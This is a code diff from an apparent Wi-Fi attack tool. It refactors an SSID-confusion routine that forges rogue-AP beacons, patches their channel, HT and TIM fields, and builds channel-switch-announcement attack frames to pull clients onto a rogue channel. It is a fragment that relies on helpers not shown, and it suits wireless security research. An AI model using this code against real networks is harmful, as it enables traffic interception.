@@ -20,32 +20,16 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 	// scan for real AP beacon on real channel
 	setup_real_AP_RSN_frames(att_cfg.at("beacon_timeout_sec"));
 
-    // rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel
-    auto confused_beacon = make_confused_beacon(*beacon, confused_ssid);
-	// same as rogue_ap
-    confused_beacon->addr2(rogue_ap.get(SK::mac));
-    confused_beacon->addr3(rogue_ap.get(SK::mac));
-
-    if(auto *ch_ie = confused_beacon->search_option(Dot11ManagementFrame::DS_SET))
-        const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
-    if(auto *ht_ie = confused_beacon->search_option(Dot11ManagementFrame::HT_OPERATION)) {
-        if(ht_ie->data_size() >= 1)
-            const_cast<uint8_t *>(ht_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
-    }
-    if(auto *tim_ie = confused_beacon->search_option(Dot11ManagementFrame::TIM)) {
-        vector tim(tim_ie->data_ptr(), tim_ie->data_ptr() + tim_ie->data_size());
-        if(tim.size() >= 4)
-            fill(tim.begin() + 3, tim.end(), 0xFF);
-        confused_beacon->remove_option(Dot11ManagementFrame::TIM);
-        confused_beacon->add_option({Dot11ManagementFrame::TIM, static_cast<uint32_t>(tim.size()), tim.data()});
-    }
+    auto confused_beacon = make_confused_beacon(*beacon,
+        HWAddress<6>(rogue_ap.get(SK::mac)), netconfig.rogue_channel, confused_ssid);
     probe_resp = std::make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*confused_beacon, netconfig.rogue_channel));
 
 	csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, beacon, sta.get(SK::mac), true);
     Dot11Beacon legacy_beacon = expected_vht_beacon_attack::build_legacy_beacon(*beacon);
 
     // BPF: AP + client traffic only
-	const string bpf = "(type data or type mgt) and (ether host " + ap.get(SK::permanent_mac) + " or ether host " +
+	const string bpf = //"(type data or type mgt) and "
+					"(ether host " + ap.get(SK::permanent_mac) + " or ether host " +
 	sta.get(SK::permanent_mac) + " or ether host " + rogue_sta.get(SK::permanent_mac) + " or ether host " +
 	rogue_ap.get(SK::permanent_mac) + ")";
 
